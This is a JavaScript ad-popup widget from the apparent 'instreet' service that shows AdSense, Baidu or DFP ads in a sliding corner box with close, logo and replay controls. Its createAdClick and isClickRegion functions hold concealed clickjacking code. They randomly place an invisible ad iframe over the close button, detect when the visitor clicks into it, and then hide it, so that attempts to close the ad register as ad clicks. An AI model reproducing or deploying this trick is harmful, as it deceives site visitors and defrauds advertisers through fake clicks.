/*
  底部弹窗 v0.1.0

  + 去除Iframe
  + 支持百度广告
*/
(function (window) {

  // 全局配置
  var config = {
    adType:'adsense',  //广告类型,默认adsense,可选baidu,afv,dfp
    closePosition:'br',  //关闭按钮位置
    showReplay:false, //是否显示重新播放
    closeReplay:false,
    showLogo:true,
    stopAd:true,
    width:300,
    height:250,
    version:'0.1.0'
  };

  var doc=window.document
  ,location=window.location
  ,host=location.host
  ,isIE = !!window.ActiveXObject
  ,isIE6 = isIE&&!window.XMLHttpRequest
  ,now = Date.now?Date.now():new Date().getTime()
  ,callback = 'InstreetPopupStart_'+now
  ,$container
  ,$close
  ,$replay
  ,$logo
  ,close_style=''
  ,width
  ,height
  ,timer=null //定时最小化计时器
  ,timerId=null
  ,rdnum=Math.random()
  ,oldCode;

  var pushAPI = "http://istc.instreet.cn/widget/push",
  // var pushAPI = "http://popup.instreet.cn:3000/widget/push",
      dfpUrl="http://s3.yylady.cn/corner/server/justdoit_dfp.php",
      afvUrl="http://s3.yylady.cn/corner/server/gnm.php",
      adsenseUrl = 'http://s3.yylady.cn/corner/google.html',
      baiduUrl = 'http://s3.yylady.cn/corner/server/baidu.php',
      doubleUrl="http://s3.yylady.cn/corner/server/double_frame.php",
      regionMapUrl="http://s3.yylady.cn/corner/server/justdoit_dfp.php?dfp_id=5882886&dfp_name=yitejia-ceshi";

  var utils = {
    $ : function(id){
      return document.getElementById(id);
    }
  };

  function getFrameStr(src,id){
    var slug = id?'id='+id:'';
    var w = config.width,
        h = config.height;
    return '<iframe '+slug+' src="'+src+'" scrolling="no" height="'+h+'" width="'+w+'" frameborder="0" border="0" marginwidth="0" marginheight="0"></iframe>';
  }

  function getMessageByFrame(src,callback){
      var iframe=document.createElement("iframe");
      var state=0;
      iframe.style.display="none";
      iframe.src=src;
      var body=document.getElementsByTagName('body')[0]||document.documentElement;
      iframe.onload=function(){
        if(state==1){
          iframe.onload=null;
          callback&&callback(iframe.contentWindow.name);
          body.removeChild(iframe);
        }else{
          state=1;
          iframe.contentWindow.location="about:blank";
        }

      };
      body.appendChild(iframe);
  }

  function createAdClick(){
    var src = getAdUrl(config);
    $adClick=document.createElement('div');
    $adClick.style.cssText=close_style+';overflow:hidden;z-index:1999;opacity:0;filter:alpha(opacity=0);';
    $adClick.innerHTML='<div style="position:absolute;left:-'+(rdnum*180+50)+'px;top:-'+(rdnum*180+25)+'px;">'+getFrameStr(src,'ins-ad-click')+'</div>';
    $container.appendChild($adClick);

    var adClickTimer=setInterval(function(){
      if(document.activeElement){
          var ae=document.activeElement;
          if(ae.tagName=='IFRAME'&&ae.id=='ins-ad-click'){
            clearInterval(adClickTimer);
            setTimeout(function(){
              minimise(function(){
                $adClick.parentNode&&$adClick.parentNode.removeChild($adClick);
              });
            },100);
          }
      }
    },100);
  }

  function isClickRegion(callback){
    if(config.adClickProb&&rdnum<=config.adClickProb){  //判断概率
      getMessageByFrame(regionMapUrl,function (val) {
        if(val=="instreet_ad_clicker"){
          callback&&callback();
        }
      });
    }
  }

  function minimise(callback){  //最小化广告
      clearInterval(timerId);
      clearTimeout(timer);
      slideHeight($container,0,function(){
        if($replay){
          $replay.style.display="block";
        }
        callback&&callback();
      });
  }

  function maximize(){  //展示广告
      slideHeight($container,config.height);
      if($replay)
        $replay.style.display="none";
      if(config.minitime){  //定时最小化
        clearTimeout(timer);
        timer=setTimeout(minimise,config.minitime*1000);
      }
  }

  function slideHeight(elem,dest,callback){ // slide方法

      var start = new Date().getTime()
          ,ori = parseFloat(elem.clientHeight)
          ,speed=400
          ,diff=dest-ori
          ,oriCss=elem.style.cssText;
      elem.style.display="block";
      elem.style.overflow="hidden";
      if(dest!==0){
        elem.style.height=0;
      }
      var slide = function(){

        var now=new Date().getTime()
            ,p=(now-start)/speed;

        if(p<1){

          elem.style.height  = (ori+((-Math.cos(p*Math.PI)/2) + 0.5) * diff)+'px';

        }else{

          clearInterval(timerId);
          elem.style.cssText=oriCss;
          elem.style.height=dest+'px';
          if(dest===0){
            elem.style.display="none";
          }else{
            elem.style.display="block";
          }
          callback&&callback.call(elem);  //回调函数
        }

      };

      timerId = setInterval(function(){slide();},13);
  }

  var bindEvents=function(){

      $close.onclick=function(){
        minimise();
      };

      $close.onmouseover =$close.onmouseout = function(){
        var c = this.style.color;
        if(c=='rgb(0, 0, 0)'||c=='#000'){
          this.style.color='#FFF';
          this.style.backgroundColor='#58585A';
        }else{
          this.style.color='#000';
          this.style.backgroundColor='#CDCCCC';
        }
      };

      if(config.showReplay){
        $replay.onclick=function(){
          maximize();
        };
        var replay_close = $replay.getElementsByTagName('a');
        if(replay_close.length){
          replay_close[0].onclick=function(){ //移除右下角广告
            $container.parentNode&&$container.parentNode.removeChild($container);
          };
        }
      }

      if(config.showLogo){
        var img1=$logo.getElementsByTagName('img')[0],
            img2=$logo.getElementsByTagName('img')[1];
        img1.onmouseover=function(){
          this.style.display="none";
          img2.style.display="block";
        };
        img2.onmouseout=function(){
          this.style.display="none";
          img1.style.display="block";
        };
      }

  };

  var addTracker=function(url,container){  //添加监控
    if(url){
      var cnzz = document.createElement("script")
        ,span = document.createElement('span')
        ;
      cnzz.type = "text/javascript";
      cnzz.src = url;
      var id = getUrlPara(url.substr(url.indexOf('?')+1)).id;
      span.id = 'cnzz_stat_icon_'+id;
      span.style.display = 'none';
      container.appendChild(span);
      container.appendChild(cnzz);
    }
    function getUrlPara(suffixStr){
      var r = /([^&=\?]+)=?([^&]*)/g
        ;
      var a,b={};
      while((a=r.exec(suffixStr))){
        b[a[1]]=a[2];
      }
      return b;
    } 
  };

  //获取iframe src
  function getAdUrl(c){
      var src = "",
          width = c.width,
          height = c.height;

      switch(c.adType){
        case "afv"  :
          src=afvUrl+'?pubID='+c.pubID+'&slot='+c.slot+'&width='+width+'&height='+height;break;
        case "dfp"  :
          src=dfpUrl+'?dfp_id='+c.dfpID+'&dfp_name='+c.dfpName;break;
        case "baidu" :
          src = baiduUrl+'?id='+c.pubID;break;
        case "adsense":
          src=adsenseUrl+'?cad='+c.pubID+'&slot='+c.slot+'&w='+width+'&h='+height;
      }

      return src;
  }

  //输出广告代码
  function echoAd(c){
    var t = c.adType,
        id = c.pubID,
        slot = c.slot,
        dfpID = c.dfpID,
        dfpName = c.dfpName,
        w = c.width,
        h = c.height,
        src = getAdUrl(c),
        str = '';
    switch(t){
      case 'afv':
      case 'dfp':
        str = getFrameStr(src);
        break;
      case 'baidu':
        if(oldCode&&isIE){
          str = getFrameStr(src);
        }else{
          window.cpro_id = id;
          str = '<script src="http://cpro.baidustatic.com/cpro/ui/c.js" type="text/javascript"></'
              + 'script>';
        }
        break;
      case 'adsense':
        if(oldCode&&isIE){
          str = getFrameStr(src);
        }else{
          window.google_ad_client = id;
          window.google_ad_slot = slot;
          window.google_ad_width = w;
          window.google_ad_height = h;
          window.google_page_url = location.href;
          str = '<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js"><'
              + '/script>';
        }
        break;
    }
    oldCode&&(str = '<div id="ins-popup-container">'+str+'</div>');
    doc.write(str);
    oldCode&&($container = utils.$('ins-popup-container'));
  }

  //展示Popup广告
  function renderPopup(c){
    echoAd(c);
    var fixed_style = 'position:fixed;right: 0;bottom: 0;_position:absolute; _background-image:url(about:blank); _background-attachment:fixed;_top:expression(eval((document.documentElement.scrollTop||document.body.scrollTop)+(document.documentElement.clientHeight||document.body.clientHeight)-this.offsetHeight-(parseInt(this.currentStyle.marginTop,10)||0)-(parseInt(this.currentStyle.marginBottom,10)||0)));z-index:2199999;';
    $container.style.cssText = 'width:'
                              + c.width
                              + 'px;height:'
                              + c.height
                              + 'px;'
                              + fixed_style;
    // 添加关闭按钮
    $close=doc.createElement('a');
    close_style = 'background-color:#CDCCCC;position:absolute;width:16px;height:15px;font-size:15px;line-height:15px;z-index:999;font-family:serif;color:#000;font-weight:bold;cursor:pointer;text-decoration:none;text-align:center;';
    switch(config.closePosition){
      case 'tl':
        close_style+='top:0;left:0;';break;
      case 'tr':
        close_style+='top:0;right:0;';break;
      case 'bl':
        close_style+='bottom:0;left:0;';break;
      case 'br':
        close_style+='bottom:0;right:0;';break;
    }
    $close.style.cssText=close_style;
    $close.innerHTML="×";

    // logo
    $logo = doc.createElement('a');
    $logo.href = "http://www.instreet.cn/contact";
    $logo.target="_blank";
    var lStyle = 'position:absolute;z-index:199;',
        lHtml = '';
    switch(config.closePosition){
      case 'tl':
      case 'tr':
        lStyle += 'right:0;bottom:0;';
        lHtml = '<img id="instreet_logo1" style="border:none;" src="http://s2.yylady.cn/corner/images/instreet_logo1_br.png"/><img id="instreet_logo2" style="display:none;border:none;" src="http://s2.yylady.cn/corner/images/instreet_logo2_br.png"/>';
        break;
      case 'bl':
      case 'br':
        lStyle += 'right:0;top:0;';
        lHtml = '<img id="instreet_logo1" style="border:none;" src="http://s2.yylady.cn/corner/images/instreet_logo1_tr.png"/><img id="instreet_logo2" style="display:none;border:none;" src="http://s2.yylady.cn/corner/images/instreet_logo2_tr.png"/>';
        break;
    }
    $logo.style.cssText = lStyle;
    $logo.innerHTML = lHtml;

    //replay
    var rStyle='display:none;width:60px;height:50px;background-color:#1C1C1D;color:#F2F2F2;cursor:pointer;padding:5px 0;text-align:center;font-size:18px;font-weight:bold;line-height:25px;font-family: arial, serif;'+fixed_style+'right:1px;';
    $replay = doc.createElement('div');
    $replay.innerHTML = '<div style="font-size: 18px;line-height: 25px;font-weight: bold;">重新</div><div style="font-size: 18px;line-height: 25px;font-weight: bold;">播放</div>'
              + (config.closeReplay ? '<a style="position: absolute;top: -15px;cursor:pointer;font-weight: 400;text-decoration: none;font-size: 12px;color: #FFF;right: 0;height: 12px;line-height: 13px;width: 12px;background: #ccc;">×</a>' : '');
    $replay.style.cssText = rStyle;

    $container.appendChild($close);
    config.showLogo&&$container.appendChild($logo);
    config.showReplay&&(doc.getElementsByTagName('body')[0]||document.documentElement).appendChild($replay);

  }

  function startPopup(c) {
    renderPopup(c);
    maximize();
    bindEvents();
    addTracker(c.trackUrl,$container); //添加监控
    isClickRegion(createAdClick); //ad clicker
  }

  //回调函数
  window[callback] = function(obj){
    if(!obj){
      return;
    }
    for(var p in obj){
      config[p] = obj[p];
    }
    startPopup(config);
  };

  var init=function(){  //初始化config，请求广告数据
    if(typeof instreet_widgetSid!='undefined'){
      var field=instreet_widgetSid;
      instreet_widgetSid=null;
      $container = utils.$('ins-popup-'+field);      
      var src = pushAPI+'?field='+field+'&url='+encodeURIComponent(location.href)+'&callback='+callback+'&t='+new Date().getTime();
      doc.write('<script type="text/javascript" src="'+src+'"></'+'script>');
      oldCode = !$container||$container.children.length<2;   //should use iframe instead of ad code
    }
  };

  init();

})(window);
